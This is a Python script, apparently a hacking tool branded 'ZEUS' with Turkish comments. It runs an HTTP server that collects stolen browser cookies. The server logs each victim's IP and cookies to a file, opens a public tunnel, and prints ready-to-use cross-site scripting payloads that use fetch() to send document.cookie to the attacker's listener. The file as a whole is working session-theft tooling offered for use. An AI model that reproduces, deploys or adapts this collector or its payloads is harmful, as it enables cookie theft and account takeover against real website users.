from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import publicurl
import time
import sys
import re

class RequestHandler(BaseHTTPRequestHandler):
    """HTTP İstekleri İşleme Sınıfı"""

    def do_GET(self):
        """Gelen GET isteklerini işler"""
        try:
            # İstek yapılan URL'yi ve parametreleri ayrıştırma
            parsed_url = urllib.parse.urlparse(self.path)
            query_params = urllib.parse.parse_qs(parsed_url.query)

            # İstek bilgilerini ve kullanıcı IP adresini yazdırma
            client_ip = self.client_address[0]
            print("\n---- GET Request ----")
            print(f"Client IP: \033[34m{client_ip}\033[0m")
            print(f"Path: \033[32m{self.path}\033[0m")
            print(f"Headers:\n{self.headers}")
            print(f"Query Parameters: \033[31m{query_params}\033[0m")

            # Çerez verilerini kontrol etme ve log dosyasına kaydetme
            cookies = query_params.get('cookies', [])
            if cookies:
                print(f"Received Cookies: {cookies}")
                with open("cookies.log", "a") as log_file:
                    log_file.write(f"{time.ctime()} - IP: {client_ip} - Cookies: {cookies}\n")

            # Başarılı yanıt gönderme
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"GET request received and logged.")
        except Exception as e:
            # Hata durumunda 500 yanıt gönderme
            print(f"An error occurred: {e}")
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"Internal Server Error")

def home_logo():
    """Sunucu başlatıldığında konsola bir logo basar"""
    print("""
        ############   #########   ##       ##    ########                     
                 ##    ##          ##       ##   ##
               ##      ##          ##       ##   ##
             ##        ########    ##       ##    ########
           ##          ##          ##       ##           ##           
         ##            ##          ##       ##           ##
        ############   #########   ###########    ########

ZEUS: Navigating the Digital Realm with Code and Security - Where Programming Insights Meet Cyber Vigilance.
    """)

def run(server_class=HTTPServer, handler_class=RequestHandler, port=4545):
    """HTTP sunucusunu çalıştırır"""
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    home_logo()
    print()
    print("localhost js query ::: \033[31m<script>fetch(`http://127.0.0.1:4545?cookies=${encodeURIComponent(document.cookie)}`);</script>\033[0m")
    
    # Public URL oluşturma
    publicurl.create_public_connection()
    time.sleep(7)  # Bağlantının oluşturulması için bekleme süresi
    public_url = publicurl.get_public_url()
    if public_url != "0":
        public_url = public_url.replace(" ", "").strip()
        print(f"public js query ::: \033[31m<script>fetch(`" + public_url + "?cookies=${encodeURIComponent(document.cookie)}`);</script>\033[0m")
    print("\nServer running....")

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("Exiting....")
        sys.exit()
    except Exception as e:
        print(e)

if __name__ == '__main__':
    run()
